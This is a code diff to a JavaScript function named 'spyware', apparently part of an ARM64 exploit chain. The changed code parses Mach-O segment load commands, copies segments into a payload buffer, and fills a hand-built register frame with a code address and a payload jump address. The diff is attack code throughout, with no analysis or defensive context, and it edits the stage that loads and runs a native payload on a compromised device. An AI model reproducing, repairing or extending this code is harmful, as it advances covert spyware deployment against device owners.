@@ -154,9 +154,10 @@ function spyware(stage1, memory, binary)
         var cmd = binary.u32(off);
         if(cmd == 0x19) // LC_SEGMENT_64
         {
-            var vmstart = binary.readInt64(off + 0x18);
-            if(!(vmstart.hi() == 0 && vmstart.lo() == 0))
+            var filesize = binary.readInt64(off + 0x30);
+            if(!(filesize.hi() == 0 && filesize.lo() == 0))
             {
+                var vmstart = binary.readInt64(off + 0x18);
                 var vmend = Add(vmstart, binary.readInt64(off + 0x20));
                 if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() < pstart.lo()))
                 {
@@ -186,12 +187,12 @@ function spyware(stage1, memory, binary)
         var cmd = binary.u32(off);
         if(cmd == 0x19) // LC_SEGMENT_64
         {
-            var vmaddr   = binary.readInt64(off + 0x18);
-            if(!(vmaddr.hi() == 0 && vmaddr.lo() == 0))
+            var filesize = binary.readInt64(off + 0x30);
+            if(!(filesize.hi() == 0 && filesize.lo() == 0))
             {
+                var vmaddr   = binary.readInt64(off + 0x18);
                 var vmsize   = binary.readInt64(off + 0x20);
                 var fileoff  = binary.readInt64(off + 0x28);
-                var filesize = binary.readInt64(off + 0x30);
                 if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() < filesize.lo()))
                 {
                     filesize = vmsize;
@@ -207,12 +208,13 @@ function spyware(stage1, memory, binary)
                 fileoff = fileoff.lo();
                 filesize = filesize.lo();
                 payload.set(binary.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
-                binary.writeInt64(off + 0x18, Add(vmaddr, shslide));
+                //binary.writeInt64(off + 0x18, Add(vmaddr, shslide)); XXX
+                // TODO: remove writeInt64
             }
         }
         off += binary.u32(off + 0x4);
     }
-    payload.set(binary.slice(0x20, off), 0x20);
+    //payload.set(binary.slice(0x20, off), 0x20); XXX
 
     payload.u32 = _u32;
     payload.read = _read;
@@ -391,10 +393,10 @@ function spyware(stage1, memory, binary)
     arr[pos++] = 0xdead0077;                // x21
     arr[pos++] = 0xdead0078;                // x20
     arr[pos++] = 0xdead0079;                // x20
-    arr[pos++] = 0xdead007a;                // x19
-    arr[pos++] = 0xdead007b;                // x19
-    arr[pos++] = 0xdead007c;                // x29
-    arr[pos++] = 0xdead007d;                // x29
+    arr[pos++] = codeAddr.lo();             // x19
+    arr[pos++] = codeAddr.hi();             // x19
+    arr[pos++] = 0xdead007a;                // x29
+    arr[pos++] = 0xdead007b;                // x29
     arr[pos++] = jmpAddr.lo();              // x30 (payload)
     arr[pos++] = jmpAddr.hi();              // x30 (payload)
 
